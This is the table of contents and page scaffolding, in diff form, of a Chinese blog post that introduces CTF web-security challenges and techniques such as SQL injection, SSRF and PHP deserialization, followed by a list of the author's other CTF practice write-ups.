+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">01 CTF Web介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">一、所需知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.HTTP抓包&#x2F;改包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.Web前端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.Web后端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.数据库和服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.6.</span> <span class="toc-text">6.常见web漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.7.</span> <span class="toc-text">7.工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">二、题目类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.筑基（入门题目）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">(1)例子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">(2)文件泄露总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">(3)请求修改、重放</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">(4)JSFuck</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.结丹(常规题目)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">(1)SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">(2)XXE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.元婴(困难题目)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">例子：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">02 CTF Web技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">一、PHP弱类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.1.</span> <span class="toc-text">弱等于号 &quot; &#x3D;&#x3D; &quot;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.2.</span> <span class="toc-text">例题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.3.</span> <span class="toc-text">二、PHP函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">类型转换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">正则表达式（ereg&#x2F;eregi）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.4.</span> <span class="toc-text">三、变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">extract()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.4.2.</span> <span class="toc-text">parse_str()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.4.3.</span> <span class="toc-text">$$</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.4.4.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.5.</span> <span class="toc-text">四、命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.5.1.</span> <span class="toc-text">PHP中执行系统命令的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.5.2.</span> <span class="toc-text">Bypass空格过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.5.3.</span> <span class="toc-text">命令分隔符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.5.4.</span> <span class="toc-text">利用$()，&#96;&#96;执行命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.5.5.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.6.</span> <span class="toc-text">五、SSRF技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.6.1.</span> <span class="toc-text">SSRF介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.6.2.</span> <span class="toc-text">SSRF攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.6.3.</span> <span class="toc-text">SSRF防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.7.</span> <span class="toc-text">六、反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.7.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.7.2.</span> <span class="toc-text">数组序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.7.3.</span> <span class="toc-text">对象序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.7.4.</span> <span class="toc-text">其它数据类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.7.5.</span> <span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.7.6.</span> <span class="toc-text">PHP中可以利用的内置类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.7.7.</span> <span class="toc-text">练习</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section class="changyan" id="comments">
+  <!--<div id="uyan_frame"></div>-->
+  <div id="SOHUCS"></div>
+  <script charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/changyan.js"></script>
+  <script type="text/javascript">
+    window.changyan.api.config({
+      appid: 'xxxx',
+      conf: 'xxxxxxxxx'
+    });
+  </script>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2021/04/15/tuzi/" title="下一篇: 攻防世界练习">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/04/15/zhishidian/">Web常见知识点总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/15/tuzi/">攻防世界练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/08/ci/">buu练习[GKCTF2020]CheckIN</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/07/pig/">练习-[BJDCTF 2nd]假猪套天下第一 73</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/06/ssti/">SSTI注入&&[BJDCTF2020]The Mystery of Ip 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/05/daima/">Buu练习[强网杯 2019]高明的黑客</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/01/b/">任意下载漏洞&&[RoarCTF 2019]Easy Java 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/31/xxs/">Ctf Xss利用_xss总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/30/pop/">Pop链->[MRCTF2020]ezpop</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/25/fxl/">Php反序列化--->魔法函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/20/gj/">Web步骤</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/18/zj/">CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/13/web/">攻防世界练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/10/fan/">反序列化&Web信息搜集知识点总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/26/mz/">Sqli-Labs靶场8-10</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/22/bc/">Sqli-Labs靶场6-7</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/15/hack/">25-buu练习[BJDCTF 2nd]old-Hack 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/14/guge/">24-buu练习[BJDCTF 2nd]fake Google 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/12/list/">23-buu练习[GYCTF2020]Blacklist</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/10/baby-1/">22-buu练习[GXYCTF2019]BabySQli</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/08/ssrf/">21-Buu练习[网鼎杯 2018]Fakebook（ssrf漏洞）</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/07/zip/">20-Buu练习[极客大挑战 2019]PHP1</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/05/nizhuansiwei/">19-buu练习[ZJCTF 2019]NiZhuanSiWei</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/03/buy/">18-Buu练习[极客大挑战 2019]BuyFlag</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/01/bachang/">Sqlilabs靶场1-5</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/31/baby/">17-Buu练习baby Sql</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/30/suibianzhu/">16-Buu练习[强网杯 2019]随便注</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/29/cat/">15-Buu练习have Fun</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/28/shell/">14-buu练习Knife</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/27/txt/">13-Buu练习easy_tornado</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/26/clac/">12-buu练习Easy Clac</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/25/love/">11-Buu练习lovesql</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/24/sql/">10-buu练习EasySQL2</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/23/mdwu/">9-buu练习Easy MD5</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/22/bak/">8-buu练习[ACTF2020 新生赛]BackupFile</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/21/hhh/">7-Buu练习[极客大挑战 2019]Http</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/20/exec/">6-buu练习[ACTF2020 新生赛]Exec</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/19/ping/">5-buu练习Ping Ping Ping</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/18/bu/">4-buu练习EasySQL1</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/17/buu/">3-buu练习Secret File</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/16/include1/">2-buu[ACTF2020 新生赛]Include</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/15/phpshenji/">1-Php审计buu第一题</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/15/php%E9%9D%B6%E5%9C%BA/">Sqlilabs靶场的搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/04/php/">Phpstudy的使用-站点的创建</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/04/weixieyi/">伪协议Wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/02/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">Php伪协议笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/30/bugku/">日常小练</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/28/html/">Html</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/27/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%962/">Php变量覆盖2</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/26/basic-rce2/">basic.rce2</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/24/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%961/">被摧残的第二天</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/23/basic-rce1/">Baba童鞋的web第一天记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/19/leetcode/">准霸霸的Leetcode第一次提交</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/18/%E6%88%90%E4%B8%BA%E9%9C%B8%E9%9C%B8/">今天的菜鸟，明天的霸霸</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/17/hello-world/">Hello World</a></li></ul>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2021 Jialu
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 1;
+            var backgroundimg = "url(/background/bg-" + backgroundnum +".jpg)";
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":250,"height":500},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="0,0,0" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+<!-- 雪花特效 -->
+<script type="text/javascript" src="\js\snow.js"></script>
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
